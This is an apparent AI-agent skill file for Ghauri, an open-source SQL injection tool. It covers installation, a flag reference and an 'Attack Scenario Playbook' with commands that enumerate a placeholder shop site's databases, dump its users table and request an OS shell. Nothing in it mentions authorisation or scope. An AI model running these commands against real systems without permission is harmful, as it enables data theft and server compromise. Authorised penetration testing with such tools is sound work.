---
name: ghauri-sqli-detect
description: "Ghauri performs standard parameter injection and database extraction. Signals: web vulnerabilities, injection, injection detection and type identification, database name enumeration, table enumeration."
zh-signals: "Ghauri: 常规参数注入拖库。信号:web漏洞,注入,注入检测+类型识别,枚举数据库名,枚举表。"
when-to-use: >-
  Use when a web parameter is suspected of SQL injection and you need to detect
  and fingerprint it, enumerate databases and tables, and dump data non-
  interactively.
---

# Ghauri

- Attack Category: C09 Web Exploitation (SQL Injection)
- Upstream Repository: https://github.com/r0oth3x49/ghauri
- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install ghauri
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `ghauri -u 'https://t.com/page?id=1'` | Injection detection + type identification |
| `--dbs` | Enumerate database names |
| `-D db --tables` | Enumerate tables |
| `-D db -T users --dump` | Dump the database |
| `--batch --level 3` | Non-interactive + deeper testing |
| `--current-user --is-dba` | Determine the current user and DBA status |
| `-r req.txt -p id` | Specify the parameter from a request file |
| `--os-shell` | Stacked queries to get a system shell |

## Attack Scenario Playbook

### Standard parameter injection to dump the database

```bash
ghauri -u 'https://shop.t.com/item.php?id=12' --batch --dbs
ghauri -u 'https://shop.t.com/item.php?id=12' -D shop -T users --dump
```

## Notes

A modern alternative to sqlmap; written in Python 3, supports request files and HTTP/2, with syntax highly similar to sqlmap.
